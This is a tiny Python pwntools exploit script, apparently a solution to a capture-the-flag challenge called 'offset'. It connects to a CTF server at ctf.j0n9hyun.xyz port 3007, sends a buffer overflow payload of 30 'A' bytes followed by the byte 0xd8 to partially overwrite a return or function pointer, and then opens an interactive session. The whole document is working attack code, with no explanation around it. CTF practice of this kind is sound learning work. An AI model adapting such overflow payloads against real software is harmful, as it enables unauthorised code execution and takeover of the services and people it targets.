from pwn import *

#r = process('./offset')
r = remote('ctf.j0n9hyun.xyz', 3007)

payload = ''
payload += 'A'*30
payload += "\xd8"

r.recvuntil('\n')
r.send(payload)
r.interactive()
